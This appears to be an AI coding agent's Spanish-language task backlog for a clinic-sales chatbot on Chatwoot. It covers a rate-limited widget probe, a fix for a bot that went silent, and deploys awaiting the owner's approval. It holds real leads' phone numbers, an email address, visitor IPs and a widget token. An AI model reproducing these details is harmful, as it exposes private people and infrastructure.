      🔴 **El id UUID se reporta pero NO es el veredicto, y esa distinción es el ítem.** Hoy la fila
      **buena** también tiene id UUID (`ab6e629f-…`): la restauración fue un `UPDATE` sobre la fila
      que dejó el mecanismo desconocido, no una fila nueva. Un gate que se pusiera rojo por el
      formato del id estaría rojo para siempre con la tenencia correcta — el mismo modo de falla
      que `scripts/s11_desplegado.mjs` ya documenta.
      🔴 **Y apareció un segundo invariante que nadie había medido: la base NO impide que dos orgs
      se queden con el mismo inbox.** `chatwootInboxId` es `Int?` **sin `@unique`**
      (`prisma/schema.prisma:1002`), y `ClinicSettings` tampoco tiene `@@unique` sobre esa columna:
      el 409 que evita la colisión vive **sólo en la app**, en el PATCH de superadmin — y la
      escritura que rompió esto la primera vez no pasó por la app. Dos orgs sobre un inbox se ven
      las conversaciones entre sí. El gate lo detecta y lo nombra.
      **Gates:** `npm test` completo en verde, con `test:inbox-tenencia` (22 casos) cableado a la
      cadena — y verificado **en rojo primero**: `test:guards-cableados` mordió con *"estos tests
      existen y NO los corre nadie"* antes de cablearlo.

- [x] 🔴 **El chequeo de "hecho" de este carril no se podía ejecutar — y el diagnóstico escrito
      de por qué era FALSO.** Hecho el 2026-09-02. Archivos: `scripts/sonda_widget.mjs` (nuevo),
      `package.json`.
      **Gate 1 corrido, y el ítem era REAL**, pero su causa no era la anotada. Acá decía que el
      localizador expiraba *"probablemente dentro de un iframe, o montada recién al abrir el
      panel"*. Medido: **no hay iframe** (`page.frames().length === 1`) y el selector es
      `#chat-input` (el `ChatInputWrap` del widget, linea 139 — vive dentro del contenedor de Chatwoot, no en este repo). Lo que pasaba es
      que la página **nunca cargaba**: `GET /widget?website_token=…` devuelve **HTTP 429 `Retry
      later`**. La regla, textual, en el `rack_attack` de Chatwoot (initializer del contenedor, no de este repo):
      `throttle('widget?website_token=…', limit: 5, period: 1.hour)` `if req.path == '/widget' &&
      params['cw_conversation'].blank?`. **Abrir el widget sin traer conversación son 5 veces por
      hora y por IP.** Una sonda horaria que abre limpio se apaga sola y encima se come el cupo.
      La hipótesis del iframe no era sólo inútil: mandaba a arreglar el archivo equivocado.
      ⚠️ **Los leads reales NO están afectados, y se verificó en vez de suponerse.** El contador es
      por IP y Chatwoot ve la IP real de cada visitante: en su log conviven `181.115.161.191`,
      `189.28.94.168`, `181.188.170.59` (ISPs bolivianos) y `187.77.16.63`, que es este VPS. **El
      único bloqueado era el bloqueador: nosotros.**
      **La salida es `cw_conversation`.** `WidgetsController#set_token` decodifica ese parámetro,
      busca el `ContactInbox` por `source_id` y reusa el contacto — y el throttle **no aplica**
      cuando el parámetro viene. La sonda guarda su token la primera vez y después entra siempre
      por la puerta libre. Efecto de borde deseado: hay **una sola** conversación de sonda, no una
      por hora ensuciando la bandeja donde viven los leads de verdad.
      **`npm run sonda:widget`** sale **0** si el bot contestó los DOS mensajes, **1** si contestó
      uno o ninguno, **2** si no pudo medir. El `conversation_id` sale del `source_id` del propio
      token, **no** de "la conversación más nueva del inbox": adivinarla haría que la sonda juzgue
      la conversación de un lead de verdad.
      ⚠️ **El contacto se llama `Sonda QA carril chatbot` a propósito.** `scripts/objetivo_visible.mjs`
      excluye a los que somos nosotros con `/\b(prueba|qa|test)\b/i`; sin nombre, ese gate contaría
      a esta sonda como "un desconocido escribió" y **el carril se declararía cumplido por su
      propia sonda**. Hay un caso que lo afirma.
      🔴 **Los tres falsos verdes que encontró el veredicto, y que un conteo ingenuo no ve.**
      (1) Los `message_type = 3` son los enlatados del pre-chat: salen en el **mismo milisegundo**
      que el entrante y salen **siempre**, también con el bot mudo — contarlos pinta de verde
      exactamente el bug. (2) "Hubo 2 salientes" es verde con **dos respuestas al primer mensaje y
      cero al segundo**, que es literalmente el bug de la semana: se cuenta **por turno**. (3) Una
      respuesta tiene que venir después de **su** entrante y del más reciente, o una sola respuesta
      da por contestados dos mensajes seguidos.
      **Probado que MUERDE, y ahí aparecieron DOS casos que pasaban en falso.** Cuatro mutaciones;
      en la primera pasada **sólo dos** se pusieron rojas. Las otras dos —"la saliente contesta
      cualquier turno" y "juzgar el histórico entero"— sobrevivían porque los casos estaban mal
      construidos: el de la saliente huérfana la ponía **antes** del primer entrante, donde no hay
      turno abierto que ensuciar, y el del histórico ya venía rojo por otro motivo, así que el
      veredicto no cambiaba. Reemplazados por los dos que sí muerden (*una respuesta no alcanza
      para dos entrantes seguidos* y *un mudo de una vuelta vieja no deja el gate rojo para
      siempre*). Ahora las **cuatro** mutaciones caen, cada una en **su propia** aserción.
      **Un caso que no puede fallar no es un caso** — y el archivo tenía dos.
      **Gates:** `test:sonda-widget` (11 casos) cableado a `npm test`, verificado **en rojo
      primero**: `test:guards-cableados` mordió con *"estos tests existen y NO los corre nadie:
      test:sonda-widget"* antes de cablearlo.
      🔴 **La sonda mandó sus dos mensajes por primera vez el 2026-09-02 20:49 UTC, y el bot
      contestó los DOS.** Conversación **49**, leída en la base de producción: entrante *"Hola,
      quiero informacion sobre el sistema"* → `message_type=1`; entrante *"Tengo una clinica dental
      en Santa Cruz, somos 4 personas"* → `message_type=1` *"Perfecto, anotado que te dedicás a
      odontología, que son 4 personas…"*. **El bug de la semana no volvió**, y por primera vez eso
      está medido en vez de supuesto.

      **Esperar a la hora en punto era la salida equivocada, y estaba escrita acá.** Decía que el
      cupo se recompone solo al minuto 3. Es cierto y no alcanza: deja la única prueba del carril
      atada a que nadie haya corrido la sonda hace poco — una moneda, no un chequeo. La sonda ya
      **no abre `/widget` limpio nunca**: mintea su `cw_conversation` con el propio
      `Widget::TokenService` de Chatwoot vía `rails runner` (11 s medidos), y entra siempre por la
      puerta que `rack_attack` no cuenta. `guionBootstrap()` y `tokenDeSalida()` están exportadas y
      afirmadas: el token se saca **de entre** el ruido de WARN/INFO del runner, y si la marca no
      está **explota** en vez de guardar una línea de log como si fuera un token.
      Efecto de borde: el contacto se crea **ya nombrado** `Sonda QA carril chatbot`. Antes el
      nombre se ponía por SQL al final, sólo si la vuelta llegaba viva hasta ahí, y **cada arranque
      fallido dejaba un contacto anónimo en el inbox 4**, el de los leads de verdad — había 12 del
      2026-09-02 (`misty-leaf-844`, `lingering-water-811`…). Verificado que **no contaminan el
      objetivo**: los 395 contactos sin conversación del inbox 4 no los cuenta `objetivo:visible`,
      que cuenta conversaciones; sigue diciendo 2 desconocidos (#37 mariohassen, #35 F).

      Se cayeron dos hipótesis escritas, las dos por MIRAR la pantalla renderizada:
      - **El widget no abre en la caja de texto.** Abre en una pantalla cuyo único `<button>` dice
        **"Iniciar conversación"**; `#chat-input` recién se monta al tocarlo. Por eso expiraba el
        localizador. Ni el iframe ni *"esperar a que monte el panel"* — lo que faltaba era **un
        clic**. Con el clic la sonda mandó los dos mensajes.
      - **El nombre corto del contenedor no existe.** En Swarm es
        `onia-chatbot_chatwoot-db.1.nhgizxt2v01…`, con sufijo de réplica que cambia en cada
        redeploy: `docker exec onia-chatbot_chatwoot-db` daba `No such container` **después** de
        mandar los mensajes, o sea gastaba la medición para no medir nada. Ahora los dos
        contenedores se resuelven por prefijo con `docker ps --filter`.

      🔴 **Lo único que queda, con su reproducción exacta:** correr `npm run sonda:widget` **una
      segunda vez**, con la conversación 49 ya existente, vuelve a salir **2** con
      *"waiting for locator('#chat-input')"*. La primera corrida (sin conversación) sí pasa. La
      hipótesis —**no verificada, no la anuncies sin mirarla**— es que con conversación previa el
      widget ya no muestra "Iniciar conversación" y monta otra pantalla. Se reproduce en 30 s:
      abrir la URL del widget con el `cw_conversation` de `/root/.onia/sonda-widget.json`,
      `document.body.innerText` y la lista de `<button>`. **Mirarla antes de tocar el selector.**

✅ **"Ahora" tiene combustible, y las dos veces salió de MIRAR el sistema vivo, no de la cola**: el
`bot-engine` sin versionar salió de comparar el repo contra producción, y la sonda rota salió de
intentar correr el chequeo de "hecho". Lo de abajo describe la
vuelta anterior, cuando el carril sí estaba vacío, y explica por qué mirar el sistema vivo es lo
que lo destraba.

⚠️ **"Ahora" seguía sin ítems sin empezar: el carril estaba sin combustible.** Los tres de "Después"
no son promovibles y no es trámite — el del disco es de la máquina Windows de Sergio y el propio
ítem dice que no lo arregla este carril; la data QA es un "no borrar todavía" deliberado; el QR
espera al banco (**S2**). Las 14 filas de "Bloqueado en Sergio" esperan a Sergio, y las que una
máquina puede medir ya se miden solas. Lo que destraba el carril es **S14** (darle org al inbox 4:
hay seis conversaciones de desconocidos que nadie puede abrir, cinco sin teléfono ni correo) y
**S12** (los dos horarios de demo, sin los cuales el bot contesta una vez y se calla). Los dos son
decisión de Sergio, no código.

> Los tres de "Después" siguen sin subir, y no es trámite: ninguno está frenado por código. El
> disco es de la máquina Windows de Sergio y el ítem mismo dice que no lo arregla este carril —
> medido en el VPS, que es donde corre este loop: 72 % de uso, 56 GB libres y **2** worktrees
> de `onia-platform`, no 30. La data QA es "no borrar todavía". El QR espera al banco (**S2**).

---

- [x] ✅ **RESUELTO el 2026-09-02 — el bot contesta el segundo mensaje.** La causa se sacó
      corriendo el motor contra el caso, no leyendo código: `MSG1 → stage handoff_humano, notes
      ["bienvenida","sin_horarios_que_ofrecer"]` · `MSG2 → replies 0, notes
      ["silencio:handoff_en_curso"]`. Sin Cal.com instalado, los slots de `config.mjs` siguen en
      *"HORARIO A (pendiente de definir)"*, así que `slotsPending` es SIEMPRE true y
      `welcomeResult` mandaba **toda** conversación a `handoff_humano` — que es silencio
      permanente. Y no había humano.
      **Lo más caro fue el test que lo protegía:** `knowledge.test.mjs` verificaba que el mensaje
      de bienvenida fuera correcto y **exigía `handoff_humano`**. Verde, y la conversación moría.
      Un test que mira el primer mensaje no puede ver un bot que enmudece en el segundo.
      **Arreglado:** `esperando_horario` (la rama viva) + `M0b_SIN_HORARIOS`, que acusa el dato y
      pide el contacto en vez de re-ofrecer un horario que no existe. 689 tests verdes, test nuevo
      que falla en rojo antes. Desplegado a `/opt/onia/bot` y **verificado en el widget real**.
      ⏭️ **Queda lo otro, y es de Sergio:** definir los dos horarios o instalar Cal.com (tablero
      `t_af8f44ad`). Hasta entonces el bot dice la verdad — "Sergio te coordina el horario".

- [x] ~~🔴 **El bot contesta el saludo y se calla en el SEGUNDO mensaje. Reproducido hoy, en vivo, en el inbox de los leads reales.**
      **Cómo se reproduce** (30 segundos, sin tocar nada): abrir
      `https://onia-chatbot-chatwoot.hqdqgh.easypanel.host/widget?website_token=9k5i7xnAgCbSse1EZwVChZLw`,
      escribir *"Hola, quiero informacion sobre el sistema"* → **contesta bien**; después
      *"Tengo una clinica dental en Santa Cruz, somos 4 personas"* → **nada, nunca**.
      **No es infraestructura.** Medido: `/health` dentro de `onia-center` da `ok:true`, base a
      32 ms, el camino a Chatwoot responde, el webhook está registrado en la cuenta 2 sin filtro
      de inbox (o sea que cubre el 4), y no hay incidente abierto.
      **Tampoco es el add-on.** Se probó la hipótesis y salió FALSA: se le otorgó
      `addon.whatsapp` a `onia-interna` (activo, verificado en `organization_entitlements`) y el
      bot se sigue callando igual. Queda otorgado.
      **El patrón, contado sobre las 13 conversaciones desde el 24-ago:** en el inbox 7 (QA) el
      bot sostuvo una charla entera (5 mensajes → 5 respuestas). En los inboxes 4 y 5 —los de
      leads reales— contestó **como máximo UNA vez, siempre**: 1→0, 1→0, 2→0, 1→0, 1→1, 2→1,
      2→1, 2→1. Nunca hubo una segunda respuesta a una persona real.
      🔴 **Lo primero es VERLO, no adivinarlo.** `/tmp/onia-bot-webhook.log` sólo tiene líneas de
      arranque: **ni una por mensaje**. El proceso corre con `docker exec -d`, así que su salida
      no va a ningún lado. Por eso este bug sobrevivió una semana con cinco personas escribiendo.
      **Antes de tocar el motor: que cada webhook deje una línea** con conversación, entrada, la
      rama que tomó y por qué no respondió. Con eso la causa aparece en la primera vuelta; sin
      eso se sigue adivinando.
      ⚠️ **Ojo con dar por buena una hipótesis sin probarla**: la del add-on parecía cerrada y era
      falsa. La conversación de prueba de hoy queda en el inbox 4 a propósito, para reproducir.

## Después

- [ ] **El disco de la máquina de Sergio se llenó al 100% y bloqueó el build.**
      No es una molestia: `next build` murió con `ENOSPC: no space left on device` y con
      **0 bytes libres** de 465 GB no se puede mirar ninguna pantalla. Se liberó lo
      inequívocamente muerto — la caché de npm, 308 carpetas `HeadlessChrome*` de Playwright en
      `%TEMP%`, y los `.next` de los **12 worktrees de `onia-platform` que ni siquiera tienen
      `node_modules`** (build sin con qué reconstruirse: basura por definición). Quedaron 5,9 GB
      y el build pasó. **La causa de fondo sigue ahí y no la arregla este carril:**
      `onia-platform` tiene **30 worktrees**, 13 con su propio `node_modules`. Cerrar los
      worktrees de ramas ya mergeadas es de cada carril; el de plataforma es el que lleva la
      cuenta.

- [ ] **Limpieza de la data QA NUEVA.** La del 29-ago ya se ejecutó; después se generó más:
      las conversaciones QA 39, 43 y 44 (`Cliente Prueba Bandeja`, `Cliente Insistencia Tres`,
      `Cliente Comprobante`). **No borrar todavía**: son la evidencia de cuatro ítems cerrados,
      igual que las dos orgs que el carril de producto decidió NO borrar por el mismo motivo.
      Se limpia cuando haya conversaciones reales que las reemplacen como prueba.

      ⚠️ **Corregido 2026-09-01, auditando el ítem contra la base de HOY (no contra el
      texto): la org `zzqa-horario-0001` ("ZZ QA Horario") es un fantasma — nunca existió.**
      `public.organizations` tiene hoy sólo las cuatro de siempre (`Onia (interna)`,
      `Bolivian electricidad`, `ZZ QA Clinica Chatbot`, `ZZ QA Ferreteria Tornillo`); ninguna
      con slug u org nueva de "horario". Tampoco hay un quinto inbox en Chatwoot (siguen
      siendo 3, 4, 5 y 7) ni un usuario con ese correo en `auth.users`. Las tres
      conversaciones SÍ son reales y SÍ están en `inbox_id=7` — pero es el inbox de la org
      que ya existe, `ZZ QA Clinica Chatbot`, no uno nuevo. No cambia lo que hay que hacer
      (seguir sin borrar), sólo corrige el dato falso para que nadie busque una org que no
      está.

- [ ] **Botón "Cobrar con QR" dentro de la conversación** (pieza 5 del backlog v5). El
      circuito está completo en mock y verificado mirando (`/bcp/cobrar` + `/bcp/callback`,
      contrato del banco calcado); el código no cambia para el modo real. Espera las
      credenciales del BCP — ver Bloqueado.
- 📌 **Nota para el carril web-factory (no la ejecuta este carril):** tres de las frases de
  `site.ts` dicen *"avisen cuando Onia para comercio/servicios/importadoras esté listo"*, y
  eso es **exhibir obra en la superficie de venta** — prohibido por CLAUDE.md §3. Además los
  tres rubros ya se venden. Anotado acá para que no se pierda; lo decide su dueño.
  **2026-08-31, dato nuevo que simplifica la decisión:** los cuatro exports —
  `WA_TEXT_COMERCIO`, `WA_TEXT_SERVICIOS`, `WA_TEXT_PROVEEDORES` y `WA_URL`— **no los importa
  nadie** en todo `web-factory/` (verificado por grep en el repo y por `curl` contra las páginas
  vivas: ninguna los renderiza). No hay texto que corregir: es código muerto, y `WA_URL` dice de
  sí mismo ser "el CTA general de toda la página", así que probablemente se desconectó sin
  querer. Dos caminos, los dos baratos: borrarlos, o volver a conectar `WA_URL`.

---

## Bloqueado en Sergio

> Ninguno de estos frena la cola: se anota, se avisa y se sigue con el próximo desbloqueado.

| # | Qué | Por qué sólo él | Qué desbloquea |
|---|---|---|---|
| S1 | **Probar el popup de Embedded Signup con un +591 real** (`chat.onia.com.bo` → Add Inbox → WhatsApp → Connect with WhatsApp Business) | Necesita su sesión de Meta y un chip. Todo lo nuestro está hecho desde el 28-ago: Access Verification ✅, Configuration ID `1824225392073753`, dominio JS SDK autorizado, las 3 InstallationConfigs cargadas | Que un CLIENTE conecte su propio WhatsApp solo. ⚠️ Hoy el inbox que nazca queda huérfano — ver ítem 2 de Ahora |
| S2 | **Credenciales del BCP + certificado mTLS (`.pfx`)** | Trámite bancario | El botón "Cobrar con QR" en la conversación. Sin banco no hay código que lo destrabe |
| S3 | **Traslado del 75414930 a coexistencia** — OK explícito ("vamos con A") + ventana acordada + el PIN de dos pasos a mano | El número queda MUDO 30-60 min y el rollback depende de un PIN que sólo él tiene. Runbook completo: `hermes-content/docs/ONIA_RUNBOOK_COEXISTENCIA_75414930.md` | Que Sergio siga usando su app de WhatsApp en el mismo número que atiende el bot |
| S4 | **Verificar el push "te escribieron" en su celular** (suscribirse y recibir) | Hace falta un dispositivo real | El circuito está testeado 95/95 y deployado; sólo falta la prueba física |
| S5 | **¿Silenciar el Telegram de los agentes n8n que sí trabajan?** (Vendedor, Contenido, Finanzas, Prospector, Radar IA, Web Factory Radar) + los recordatorios de agenda cada 30 min | Es su canal y su umbral de ruido. No se apagan los workflows: hacen trabajo — hay que editar el nodo de aviso de cada uno | Que Telegram vuelva a ser sólo errores, que es la regla que ya se aplicó al resto |
| S7 | **Contestar (o descartar) a los cuatro desconocidos que escribieron y nadie respondió** — conv 35 (+591 73232758, clínica dental de 4 doctores, 25-ago), 37 (+591 73021804, 28-ago), 36 (`Saguilera@ds-santacruz.bo`, 27-ago) y 34 (widget, sin dato de contacto) | Vende Sergio, y son personas reales esperando desde hace 3-6 días. Un bot no puede retomar una conversación fría de hace una semana sin que suene a spam | El primer lead atendido del carril. Dos tienen número de WhatsApp y uno correo: tres de los cuatro son alcanzables hoy |
| ~~S8~~ | ✅ **CERRADO el 2026-08-31: `Onia (interna)` → inbox 5.** Verificado en la base y MIRADO en `/inbox`. **Podado el 01-sep:** esta fila arrastraba el análisis completo de seis vueltas y seguía leyéndose como bloqueo vivo — S8 se nombra **17 veces** en este archivo, casi todas dentro de párrafos viejos que ya no aplican. Lo que quedaba abierto NO era S8 sino el **inbox 4**, y ahora tiene su propio ítem (3 de "Ahora") y su propio bloqueo (**S14**). | — | — |
| S9 | **Publicar las campañas en el VPS — y son CUATRO archivos, no uno.** 🔴 **Corregido el 31-ago (3ª vuelta): tal como estaba escrito, esto NO encendía nada.** Decía copiar sólo `campanas-onia.knowledge.json` a `/opt/onia/bot/knowledge.json` porque daba el motor por desplegado; medido con md5, el VPS está **un commit atrás** (`3e3841aa`, sin `994eb42d`) y su `bot-engine.mjs` tiene **cero `campanaExacta`** — habría ignorado las campañas en silencio. Lo que tiene que viajar: **`bot-engine.mjs` + `knowledge.mjs` + `run-turn.mjs`** (del espejo `hermes-content/deploy/vps-ops/bot/`) **+ `knowledge.json`** (desde `hermes-content/docs/chatbot/campanas-onia.knowledge.json`), y después **reiniciar** — `webhook-server.sh` sólo recopia al contenedor si cambia su STAMP. Verificar con `node hermes-content/deploy/vps-ops/bot/espejo-check.mjs` (tiene que salir 0) | Escribe en el VPS, y la regla dice que ningún deploy sale sin su OK | **El ítem 2 entero.** El motor del repo ya las lee en modo venta (**647/647 verde**, probado con este mismo documento); falta que el VPS TENGA ese motor y que el archivo del número traiga las campañas. ⚠️ **Sumado el 31-ago (4ª vuelta): `run-turn.mjs`**, que volvió a exportar `LLM_SYSTEM_PROMPT` para revivir los 12 evals. Corrido hoy contra producción, `espejo-check.mjs` sale **1**: DISTINTOS `bot-engine.mjs`, `bot-engine.test.mjs`, `knowledge.mjs`, `run-turn.mjs`, `run-turn.test.mjs`; FALTAN `campanas-web.test.mjs`, `espejo-check.mjs`, `espejo-check.test.mjs`, `recepcionista.test.mjs`. Sin esto las 4 frases vivas de onia.com.bo siguen recibiendo el saludo genérico. ✅ **Gate 1 del 31-ago (5ª vuelta): EL CÓDIGO YA VIAJÓ — S9 se achicó a UN archivo de datos.** Medido, no leído: `espejo-check.mjs` sale **0** (`ESPEJO OK`), o sea que `bot-engine.mjs`, `knowledge.mjs` y `run-turn.mjs` ya son los del repo. Y confirmado en el motor que **CORRE**, no en el host: `docker exec onia-center grep -c campanaExacta /tmp/onia-bot/bot-engine.mjs` → **2** (era 0). Lo único que falta es el documento: `/opt/onia/bot/knowledge.json` sigue en **904 bytes del 6-ago, con cero `campanas`** — dentro y fuera del contenedor. **S9 hoy = copiar `hermes-content/docs/chatbot/campanas-onia.knowledge.json` a `/opt/onia/bot/knowledge.json` y reiniciar.** 🔴 **CORREGIDO el 31-ago (9ª vuelta): ya NO alcanza el JSON solo — son TRES archivos, y hacerlo con uno EMPEORA producción.** El documento nuevo trae `prefijo` (la campaña del CTA de `/v1/empezar`), y el esquema del validador **rechaza claves desconocidas**: `parseKnowledge` devuelve `data: null`, o sea que el documento **no carga a medias, no carga nada**. Medido con el `knowledge.mjs` que HOY corre en el VPS, bajado por `scp`: `ok=false`, `campanas[4].prefijo: clave desconocida`. Copiando sólo el JSON no quedan 5 campañas de 6 — quedan **cero**, y encima se pierden la FAQ `siat` y el horario que hoy sí están vivos. **Lo que tiene que viajar junto:** `hermes-content/deploy/vps-ops/bot/knowledge.mjs` + `hermes-content/deploy/vps-ops/bot/recepcionista.mjs` + el documento a `/opt/onia/bot/knowledge.json`, y reiniciar. Verificación previa: `node hermes-content/deploy/vps-ops/bot/espejo-check.mjs` hoy sale **1** y nombra `knowledge.mjs` y `recepcionista.mjs` entre los DISTINTOS — después del `scp` tiene que salir **0**. ✅ **Sumado el 31-ago (6ª vuelta) — verificado que la copia es SEGURA, que era un riesgo sin medir.** La instrucción manda a **sobrescribir un archivo de datos vivo en producción** y nadie había comparado los dos lados: si el documento nuevo no traía algo que el viejo sí, el `scp` lo borraba en silencio. Bajado el vivo del VPS y diffeado campo por campo contra el del repo: `identity`, `empresa` (el horario lun-vie 9-18) y `triggersExtra` son **idénticos**, y la única FAQ (`siat`) es **byte a byte la misma**. El nuevo sólo agrega `campanas` (5) y sube `version` de `2026-08-06.1` a `2026-08-31.1`. Es un **superset estricto**: no se pierde nada. **Y cómo se comprueba DESPUÉS del scp** — porque este carril ya dio dos deploys por hechos sin mirarlos, y hay que medirlo en el motor que CORRE, no en el host:
  ```bash
  ssh root@187.77.16.63 "docker exec onia-center sh -c 'grep -c campanas /tmp/onia-bot/knowledge.json'"
  ```
  Tiene que dar **≥1**. Hoy da **0** dentro y fuera del contenedor (904 bytes del 6-ago), que es el estado sin S9. (Se suma al mismo `scp` `recepcionista.test.mjs`, que dejó de ser un archivo de 0 bytes — es un test, no cambia lo que corre.) ✅ **Sumado el 31-ago (10ª vuelta) — verificación PREVIA, que antes no existía:** `npm run campanas:vivas` mide **desde la calle** que el documento cubra las frases que onia.com.bo manda **hoy**. Si sale 1, el `scp` publicaría un documento que ya no matchea y no hay que hacerlo. Corrido hoy: **0** (5 de 5 cubiertas). No reemplaza al `grep -c campanas` de después — ese mide el VPS, este mide el documento. 🔴 **CORREGIDO el 2026-09-02 (auditoría de los `[x]`): S9 volvió a quedar corto, y hacerlo como dice HOY deja el motor llamando a una función que no existe.** Desde que se escribió "viajan TRES archivos", el espejo sumó una feature entera —el bot manda el link de la agenda pública de la org en vez de derivar— repartida en **cinco** archivos. Medido contra `/opt/onia/bot` real, no leído: `espejo-check` nombra ahora `config.mjs`, `intents.mjs` y `preview-route.mjs` **además** de `knowledge.mjs` y `recepcionista.mjs`. Y el acople es duro: el `recepcionista.mjs` del espejo llama a `intents.wantsToBook()` y a la plantilla `R_AGENDA`, y **ninguna de las dos existe en el VPS** (su `intents.mjs` exporta `wantsToOrder` pero no `wantsToBook`; su `config.mjs` tiene cero `R_AGENDA`). Probado ejecutando, no por grep: copiado el subconjunto que S9 mandaba a un `/tmp` con el resto del VPS, `intents.wantsToBook` da `undefined` y llamarlo tira `TypeError: intents.wantsToBook is not a function`. **La lista vigente de S9 = `bot-engine.mjs`(ya en sync) + `config.mjs` + `intents.mjs` + `knowledge.mjs` + `preview-route.mjs` + `recepcionista.mjs` + el documento `knowledge.json`** — y la manda el gate, no este párrafo: `espejo-check.mjs` ahora imprime `VIAJAN JUNTOS` con los acoples calculados en vivo. Correr el gate ANTES del `scp` y copiar lo que diga; esta lista envejece, la del gate no. **Verificador:** `node hermes-content/deploy/vps-ops/bot/espejo-check.mjs` → 0 |
| S10 | **Aplicar al VPS la defensa ampliada de la marca de Chatwoot** — `scp` de `hermes-content/deploy/vps-ops/chatwoot-brand-onia.sh` a `/root/bin/` y una corrida manual. Repara **DIEZ** `installation_configs` que Chatwoot reconcilia solo (`Internal::ReconcilePlanConfigService`, leído del YML del propio contenedor): el cron que hoy corre (`/root/bin/chatwoot-brand-onia.sh`, cada hora al minuto :17) sólo reaplica 3 de las 9 que le tocan (DISPLAY_MANIFEST queda afuera a propósito: su valor de fábrica es el que se quiere) | Reemplaza un cron que corre solo cada hora: es infra, y la regla del carril dice que el VPS es suyo | Que `BRAND_URL`, `TERMS_URL` y `PRIVACY_URL` dejen de decir `www.chatwoot.com` en el HTML público del login. Se mide **desde la calle, sin VPS ni SSH**: `npm run marca:chatwoot` (`hermes-content/deploy/vps-ops/chatwoot-marca-publica.mjs`, 8 tests) lee `window.globalConfig` del login público — antes de que existiera este gate, la reversión del 16-ago vivió quince días sin que nadie la viera, porque el único chequeo vivía dentro del contenedor. **Re-verificado en vivo el 2026-09-02: sigue en `REVERTIDAS 3/9`, exit 1**, sin cambio desde el 16-ago (ya se vigiló así ocho vueltas seguidas entre el 31-ago y hoy, siempre con el mismo resultado). **Después del `scp` y la corrida manual, tiene que salir 0.** **Verificador:** `npm run marca:chatwoot` → 0 |
| S11 | **Desplegar el producto para que el sidebar deje de mostrar `ASSIGNMENT_TURNED_IN` en letras gigantes.** El arreglo es el commit **`22fd088`** de `onia-platform`, rama `claude/chatbots-platform-review-0d1d09`. ✅ **Ya está en `origin/master`** desde el merge `503af44` (2026-09-02 12:38 UTC), así que **el deploy hoy SÍ lo alcanza** — durante horas esta fila decía lo contrario y por eso no se destrababa. **Falta sólo el swap**, y el defecto sigue vivo en producción: el contenedor `onia-platform` lleva 15 h arriba (anterior al merge) y su build todavía tiene `assignment_turned_in` — medido con `docker exec … grep -rl` sobre `/app/.next`, no leído. Esta fila se quedó corta tres veces (el commit no existía · existía sin mergear · mergeado pero la fila decía que no); por eso la lista ya no la mantiene este párrafo: `npm run deploy:alcanzable` se lo pregunta a git, y hoy sale **0**. **Y desde el 2026-09-02 esta fila se comprueba sola: `npm run s11:desplegado` le pregunta al contenedor `onia-platform` del VPS —el que CORRE, no el host ni el repo— con qué icono dibuja hoy la entrada `/requerimientos` de su build publicado. Hoy sale 1 nombrando `assignment_turned_in`; el día que Sergio haga el swap sale 0 y `npm run bloqueos:vencidos` levanta la fila solo, sin que nadie se acuerde de mirar. **Verificador:** `npm run s11:desplegado` → 0** | Es un deploy del producto, y ningún deploy sale sin su OK | Que el ítem "Requerimientos" del menú dibuje su icono. 🔴 **CORREGIDO el 2026-09-02 (auditoría de los `[x]`): esta fila mandaba a desplegar un commit que NO EXISTE.** Decía *"commit `4f86381` (rama `carril/chatbot-v68-friccion`)"* y *"ya arreglado y con su guardia en la suite (`scripts/iconos-en-la-fuente.test.ts`)"*. Medido, no leído: después de `git fetch --all --prune` contra GitHub, `git log 4f86381` da `unknown revision`, **no hay ninguna rama** que matchee `friccion` ni `v68` en las 39 remotas, y el archivo del guardia **nunca fue agregado en ninguna rama**. Ese trabajo quedó en el disco de Windows y nunca se pusheó. Un bloqueo que le pide a Sergio desplegar la nada es peor que un fantasma: no se destraba nunca. **El defecto SÍ era real y seguía vivo**, verificado RENDERIZANDO el `.woff2` que se publica (Chromium, no grep): `assignment_turned_in` mide **20em** —el texto crudo— contra **1em** de los otros 34 iconos del menú. Causa medida: el icono entró el 30-ago (`ab9e0de`) y la fuente subseteada es del 29-ago (`917adca`), así que el glifo nunca viajó; y `scripts/subset-iconos.mjs`, que corre dentro del `build`, **se rinde en silencio y sale 0** si falta `pyftsubset` (reproducido acá). **Rehecho de cero en `22fd088`:** el ítem usa `task_alt`, que ya está en el subset (no depende de que exista Python en el entorno de build), más el gate `npm run gate:iconos` (`scripts/iconos-en-la-fuente.mjs`) que renderiza los 35 iconos declarados contra la fuente publicada **sin sesión ni app levantada** — el hueco exacto por el que se coló, ya que `e2e/iconos.spec.ts` sólo mira `/`, `/login` y `/register`. Rojo por el motivo correcto antes, verde después (35/35). Gates: `tsc` limpio · **2441** tests · `eslint` 0 errores. **Verificación post-deploy:** abrir `/inbox` y mirar el menú — el ítem "Requerimientos" tiene que dibujar un tilde, no una palabra |
| S12 | **Los DOS horarios fijos de demo — sin ellos el bot deriva a un humano en el primer mensaje y se calla para siempre.** Son dos bloques semanales de SU agenda; `hermes-content/deploy/vps-ops/bot/config.mjs` los trae `pending: true` con un TODO que dice *"PROHIBIDO inventar horarios acá"*. **Contexto nuevo del 01-sep:** existía la salida automática por Cal.com y **está muerta** — no hay contenedor de Cal.com en el VPS y `cal.onia.com.bo` responde 302 a `onia.com.bo/empezar`, así que el módulo cae al placeholder en silencio. **Dos opciones, las dos baratas:** (a) Sergio dicta dos bloques fijos (ej. martes 10:00 y jueves 16:00) y quedan como dato — cero código; (b) revivir Cal.com, que es infra y cuesta más. Recomendación: **(a)**, y (b) después si molesta mantenerlos a mano | Son horas de su semana, y el código prohíbe inventarlas | **El ítem 1 de Ahora, que es el único defecto que un comprador ve.** Probado corriendo el motor con dos horarios cualesquiera: el embudo llega hasta `M2` demo agendada sin tocar una línea de código |
| S13 | **Encender el aviso `notify_sergio`** — hoy el bot pide un humano y no se entera nadie. ⚠️ **NO es "poner `ONIA_N8N_ENABLED=true`"**: `ONIA_N8N_EVENT_URL` está **vacío** y **no existe ningún workflow de n8n** que reciba el evento (listados los 44). Con la variable en `true` y sin URL el envío devuelve `failed` y **nadie se entera**, porque es fire-and-forget a propósito. **Decidir el camino:** (a) Telegram directo desde el bot, reusando el `TG_BOT_TOKEN` que `hermes-content/deploy/vps-ops/bot/webhook-watchdog.sh` ya usa en el VPS — sin workflow, sin URL, sin secreto nuevo; (b) crear el workflow de n8n y cargar la URL. Recomendación: **(a)** | Escribe en el VPS. El código lo escribe este carril; la decisión y el deploy son suyos | El ítem 2 de Ahora. Gate barato antes de mirar el celular: `"configurado":true` en el `/health` del bot |
